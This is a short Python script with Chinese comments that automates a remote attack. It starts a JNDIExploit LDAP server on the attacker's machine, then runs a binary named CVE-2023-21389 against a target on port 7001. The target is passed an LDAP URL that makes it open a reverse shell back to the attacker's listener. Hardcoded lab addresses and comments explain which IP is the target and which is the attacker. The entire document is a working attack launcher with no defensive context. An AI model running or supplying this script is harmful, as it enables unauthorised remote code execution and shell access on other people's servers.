# encoding: utf-8
import subprocess
import time

def main(ip1, ip2, port):  # ip1为目标主机ip  ip2为本机ip不可设定为127.0.0.1  port为反弹shell监听端口

    subprocess.Popen(['java', '-jar', './JNDIExploit-1.3-SNAPSHOT.jar', '-i', f'{ip2}'])
    time.sleep(5)   #为保证上一条监听能正常启动，sleep了5秒，能长不能短，很极限了
    subprocess.run(f"./CVE-2023-21389 -ip {ip1} -port 7001 -ldap ldap://{ip2}:1389/Basic/ReverseShell/{ip2}/{port}", shell=True, capture_output=True, encoding='utf-8')


main("192.168.75.168" ,"192.168.75.171", 8889)    # ip1为目标主机ip  ip2为本机ip不可设定为127.0.0.1  port为反弹shell监听端口
#        目标ip              本机ip      监听端口